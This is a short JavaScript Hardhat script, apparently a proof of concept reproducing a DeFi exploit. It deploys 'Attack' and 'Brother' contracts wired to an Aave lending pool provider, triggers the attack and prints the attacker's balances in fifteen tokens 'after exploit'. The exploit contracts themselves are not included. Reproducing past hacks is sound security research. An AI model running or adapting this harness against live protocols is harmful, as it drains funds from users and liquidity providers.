
const {
  WETH,
  fourYPool,
  XSUSHI,
  WNXM,
  PERP,
  Rune,
  DPI,
  UNI,
  USDC,
  FEI,
  USDT,
  YVCurvestETH,
  GNO,
  FTT,
  YGG,
} = require("./config")

const AAVE_LENDING_POOL_PROVIDER = "0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5"

async function getTokenBalance(token, signer) {
  contract = await ethers.getContractAt("IERC20", token.address, signer)
  const balance = await contract.balanceOf(signer.address)
  return ethers.utils.formatUnits(balance, token.decimals)
}

async function main() {
  const blockNumber = await ethers.provider.getBlockNumber()
  console.log('Block number: ', blockNumber)


  const [owner] = await ethers.getSigners()

  const Attack = await ethers.getContractFactory("Attack")
  const attack = await Attack.deploy()
  await attack.deployed()
  console.log('Deployed Attack contract to: ', attack.address)

  const Brother = await ethers.getContractFactory("Brother")
  const brother = await Brother.deploy(attack.address, AAVE_LENDING_POOL_PROVIDER)
  await brother.deployed()
  console.log('Deployed Brother contract to: ', brother.address)

  const tx = await attack.start(brother.address)

  console.log('Owner balances after exploit: ')
  console.log('WETH ', await getTokenBalance(WETH, owner))
  console.log('fourYPool ', await getTokenBalance(fourYPool, owner))
  console.log('XSUSHI ', await getTokenBalance(XSUSHI, owner))
  console.log('WNXM ', await getTokenBalance(WNXM, owner))
  console.log('PERP ', await getTokenBalance(PERP, owner))
  console.log('Rune ', await getTokenBalance(Rune, owner))
  console.log('DPI ', await getTokenBalance(DPI, owner))
  console.log('UNI ', await getTokenBalance(UNI, owner))
  console.log('USDC ', await getTokenBalance(USDC, owner))
  console.log('FEI ', await getTokenBalance(FEI, owner))
  console.log('USDT ', await getTokenBalance(USDT, owner))
  console.log('YVCurvestETH ', await getTokenBalance(YVCurvestETH, owner))
  console.log('GNO ', await getTokenBalance(GNO, owner))
  console.log('FTT ', await getTokenBalance(FTT, owner))
  console.log('YGG ', await getTokenBalance(YGG, owner))
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });